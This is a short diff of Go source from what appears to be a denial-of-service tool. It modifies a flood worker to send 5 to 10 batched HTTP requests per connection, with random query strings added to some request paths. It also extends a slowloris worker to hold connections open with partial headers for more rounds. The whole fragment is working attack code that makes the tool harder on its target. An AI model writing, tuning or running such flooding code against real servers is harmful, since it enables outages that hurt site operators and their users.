@@ -175,7 +175,9 @@ func floodWorker(id int, stop <-chan struct{}) {
 				if rand.Intn(2) == 0 {
 					reqPath += fmt.Sprintf("?rand=%d", rand.Intn(1000000))
 				}
-				conn.Write(buildRequest(method, reqPath))
+				for i := 0; i < rand.Intn(5)+5; i++ { // 5-10 Batch Request
+					conn.Write(buildRequest(method, reqPath))
+				}
 			}
 			conn.Close()
 		}
@@ -201,7 +203,7 @@ func slowlorisWorker(id int, stop <-chan struct{}) {
 			conn.Write([]byte(partial))
 
 			// Keep connection alive with partial headers
-			for i := 0; i < 10; i++ {
+			for i := 0; i < 15; i++ {
 				select {
 				case <-stop:
 					conn.Close()
